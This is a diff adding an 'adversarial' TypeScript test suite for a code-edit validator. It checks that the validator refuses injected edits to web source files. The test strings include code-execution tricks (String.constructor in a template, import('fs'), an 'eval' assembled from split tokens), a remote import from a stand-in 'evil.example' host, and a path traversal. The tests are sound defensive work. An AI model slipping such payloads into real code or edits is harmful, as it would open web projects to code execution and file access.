@@ -53,6 +53,47 @@ describe("declarations", () => {
   });
 });
 
+describe("adversarial", () => {
+  const ins = (text: string, over: object = {}) => validateEdit({ ...base, edits: [{ start: insertAt, end: insertAt, text }], ...over });
+  const top = source.indexOf("\n");
+  const topIns = (text: string) => validateEdit({ ...base, allowedRanges: [{ start: top, end: top }], edits: [{ start: top, end: top, text }] });
+  const reason = (r: { ok: boolean }) => String((r as { reason?: string }).reason);
+  it("refuses start > end", () => {
+    assert.equal(validateEdit({ ...base, edits: [{ start: objectEnd, end: objectStart, text: "" }] }).ok, false);
+  });
+  it("refuses calls inside a template", () => {
+    assert.match(reason(ins("\n  d: `${String.constructor(\"x\")()}`,")), /Call|constructor/);
+    assert.equal(ins("\n  d: `${String.constructor(\"x\")()}`,").ok, false);
+  });
+  it("refuses import()", () => {
+    assert.match(reason(ins("\n  d: import(\"fs\"),")), /Import|Call/);
+  });
+  it("refuses export * from", () => {
+    assert.equal(topIns(`\nexport * from "evil";`).ok, false);
+  });
+  it("refuses a side-effect import of a lookalike", () => {
+    assert.equal(topIns(`\nimport "https://evil.example/eumon-json-ld";`).ok, false);
+  });
+  it("refuses export const dynamic", () => {
+    assert.equal(topIns(`\nexport const dynamic = "force-dynamic";`).ok, false);
+  });
+  it("refuses ev + al merging into eval", () => {
+    const s = "const a = al(1);\n";
+    const at = s.indexOf("al");
+    const r = validateEdit({ ...base, filePath: "app/page.tsx", before: s, roots: [], allowedRanges: [{ start: at, end: at }], edits: [{ start: at, end: at, text: "ev" }] });
+    assert.equal(r.ok, false);
+  });
+  it("caps inserted characters", () => {
+    assert.match(reason(ins(`\n  d: "${"x".repeat(9000)}",`)), /characters/);
+  });
+  it("refuses path traversal", () => {
+    assert.equal(validateEdit({ ...base, filePath: "app/../x/page.tsx", edits: [] }).ok, false);
+  });
+  it("still allows new URL", () => {
+    assert.equal(ins("\n  metadataBase: new URL(\"https://x.com\"),").ok, true);
+  });
+});
+
 describe("validateFile", () => {
   it("allows only the whole-file targets", () => {
     assert.equal(validateFile("public/llms.txt", "# x", []).ok, true);
